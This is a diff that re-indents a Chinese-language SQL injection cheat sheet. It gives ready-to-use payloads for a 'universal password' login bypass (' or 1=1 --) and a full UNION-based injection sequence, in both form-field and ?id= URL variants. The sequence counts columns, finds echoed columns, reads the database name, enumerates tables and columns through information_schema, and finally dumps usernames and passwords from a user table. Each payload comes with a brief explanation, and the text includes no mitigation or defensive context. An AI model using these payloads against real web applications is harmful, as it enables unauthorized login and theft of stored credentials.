@@ -1,29 +1,35 @@
 一、万能密码（登录绕过）
 Payload：
-' or 1=1 --（用户名框输入，密码任意）
+      ' or 1=1 --（用户名框输入，密码任意）
 原理：后端 SQL 拼接为select * from user where username='' or 1=1 --' and password='xxx'；'闭合前引号，or 1=1恒真，--注释密码判断，直接返回所有用户。
 
 二、UNION 联合查询注入（有回显，拿数据）
 1. 测列数
-Payload：' order by 6 -- (不报错则列数≥6）
-?id=1 order by x#
+Payload：
+      ' order by 6 -- (不报错则列数≥6）
+      ?id=1 order by x#
 原理：order by N按第 N 列排序，报错说明无该列，确定列数
 2.  看回显（默认列数是6）
-' and 1=2 union select 1,2,3,4,5,6#
-?id=-1 union select 1,2,3,4,5,6#           
+Payload：
+      ' and 1=2 union select 1,2,3,4,5,6#
+      ?id=-1 union select 1,2,3,4,5,6#           
 3. 查库名（默认回显是第二位）
-Payload：' and 1=2 union select 1,database(),3,4,5,6 -- 
-?id=-1 union select 1,database(),3,4,5,6#
+Payload：
+      ' and 1=2 union select 1,database(),3,4,5,6 -- 
+      ?id=-1 union select 1,database(),3,4,5,6#
 原理：1=2让原查询无结果，union拼接新查询，database()返回当前库名。
 4. 查所有表
-Payload：' and 1=2 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database() -- 
-                     ?id=-1 
+Payload：
+      ' and 1=2 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database() -- 
+      ?id=-1 
 原理：information_schema.tables存库表信息，group_concat拼接所有表名。
 5. 查 user 表字段
-Payload：' and 1=2 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name='user' -- 
-                     ?id=-1 
+Payload：
+      ' and 1=2 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name='user' -- 
+      ?id=-1 
 原理：information_schema.columns存字段信息，指定表名查列。
 6. 查 user 表数据
-Payload：' and 1=2 union select 1,username,password,4,5,6 from user -- 
-                     ?id=-1 
+Payload：
+      ' and 1=2 union select 1,username,password,4,5,6 from user -- 
+      ?id=-1 
 原理：直接查询用户表账号密码，页面回显数据。
